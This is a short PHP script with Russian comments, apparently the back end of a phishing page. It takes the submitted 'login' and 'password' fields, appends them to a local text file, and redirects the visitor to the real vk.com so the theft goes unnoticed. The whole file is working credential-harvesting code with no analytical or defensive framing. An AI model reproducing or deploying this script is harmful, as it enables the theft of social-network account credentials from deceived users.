<?php
$filename = 'file.txt';
$somecontent = $_POST['login']."-".$_POST['password']."\n";
header("Location: https://vk.com");
// Вначале давайте убедимся, что файл существует и доступен для записи.
if (is_writable($filename)) {
 
    // В нашем примере мы открываем $filename в режиме "дописать в конец".
    // Таким образом, смещение установлено в конец файла и
    // наш $somecontent допишется в конец при использовании fwrite().
    if (!$handle = fopen($filename, 'a')) {
         echo "Нет прав на ($filename)";
         exit;
    }
 
    // Записываем $somecontent в наш открытый файл.
    if (fwrite($handle, $somecontent) === FALSE) {
        echo "Нет прав для записи ($filename)";
        exit;
    }
 
    echo "Успех: ($somecontent) записаны в ($filename)";
 
    fclose($handle);
 
} else {
    echo "Файл $filename недоступен для записи";
}
?>
